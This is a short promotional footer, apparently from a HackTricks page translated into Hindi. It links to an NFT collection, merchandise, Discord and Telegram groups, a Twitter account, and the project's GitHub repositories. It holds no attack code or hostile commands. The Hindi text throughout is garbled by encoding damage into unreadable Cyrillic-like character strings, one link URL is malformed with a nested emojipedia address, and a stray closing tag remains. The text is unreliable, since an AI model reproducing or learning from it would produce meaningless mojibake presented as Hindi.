- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>
